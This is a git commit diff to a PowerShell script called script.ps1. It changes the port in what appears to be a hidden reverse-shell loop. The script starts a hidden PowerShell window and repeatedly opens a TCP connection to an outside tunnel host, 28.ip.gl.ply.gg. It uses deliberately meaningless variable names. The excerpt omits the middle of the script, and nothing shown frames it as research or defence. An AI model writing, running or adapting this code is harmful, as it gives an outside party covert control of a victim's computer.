150b8e234cbbc03138871fecc1ebb52af670f6e5
MuhammadHassan001 <muhammadhassan48492@gmail.com>
2026-01-11 00:38:50 +0500

    script.ps1

--- script.ps1
+++ script.ps1
@@ -1,7 +1,7 @@
 Start-Process $PSHOME\powershell.exe -ArgumentList {
   while ($true) {
     try {
-      $a1b2c3d4e5f6g7h8i9j0 = New-Object Net.Sockets.TCPClient('28.ip.gl.ply.gg', 3047);
+      $a1b2c3d4e5f6g7h8i9j0 = New-Object Net.Sockets.TCPClient('28.ip.gl.ply.gg', 3150);
       $k1l2m3n4o5p6q7r8s9t0 = $a1b2c3d4e5f6g7h8i9j0.GetStream();
       $u1v2w3x4y5z6a7b8c9d0 = New-Object IO.StreamWriter($k1l2m3n4o5p6q7r8s9t0);
       [byte[]]$e1f2g3h4i5j6k7l8m9n0 = 0..$a1b2c3d4e5f6g7h8i9j0.ReceiveBufferSize | % {0};
@@ -32,6 +32,7 @@ Start-Process $PSHOME\powershell.exe -ArgumentList {
     }
   }
 } -WindowStyle Hidden
+
 
 
 
